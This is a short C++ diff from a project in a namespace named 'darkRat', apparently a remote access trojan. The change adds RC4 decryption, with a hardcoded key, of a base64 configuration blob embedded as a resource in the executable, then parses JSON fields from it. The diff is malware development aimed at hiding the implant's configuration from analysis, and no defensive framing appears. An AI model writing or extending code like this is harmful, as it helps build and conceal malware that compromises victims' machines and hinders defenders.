@@ -50,7 +50,7 @@ namespace darkRat
 
 		config load()
 		{
-			//absent::crypto::RC4 rc4;
+			absent::crypto::RC4 rc4;
 			HMODULE hModule = GetModuleHandle(0);
 			
 			HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(10), RT_RCDATA);
@@ -67,7 +67,8 @@ namespace darkRat
 			
 			if (strlen(bytes) > 0)
 			{
-				std::string de_config = absent::crypto::b64::decode(bytes);
+				std::string de_config = rc4.crypt(absent::crypto::b64::decode(bytes), key(0x4d930cf57cfda1ba));
+			//	std::string de_config = absent::crypto::b64::decode(bytes);
 				nlohmann::json j_config = nlohmann::json::parse(de_config);
 				std::string ek = j_config["ek"];
 				std::string pu = j_config["pu"];
